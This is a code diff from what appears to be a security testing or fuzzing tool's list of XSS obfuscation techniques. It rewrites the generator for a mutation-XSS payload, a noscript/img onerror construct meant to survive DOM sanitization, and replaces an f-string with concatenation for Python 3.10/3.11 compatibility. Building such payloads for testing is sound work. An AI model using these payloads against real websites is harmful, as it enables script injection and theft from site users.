@@ -325,7 +325,11 @@ XSS_OBFUSCATIONS: list[dict] = [
     {
         "technique": "mutation_xss",
         "description": "Mutation XSS (mXSS) — payload designed to survive DOM mutation",
-        "generator": lambda p: f"<noscript><p title=\"</noscript><img src=x onerror={p.replace('\"', '&quot;')}>\">",
+        # NOTE: built by concatenation, not an f-string — Pythons 3.10/3.11 reject
+        # backslashes inside f-string expressions, and %-formatting would choke on
+        # payloads containing '%'.
+        "generator": lambda p: "<noscript><p title=\"</noscript><img src=x onerror="
+                               + p.replace('"', "&quot;") + ">\">",
     },
     {
         "technique": "jsfuck_style",
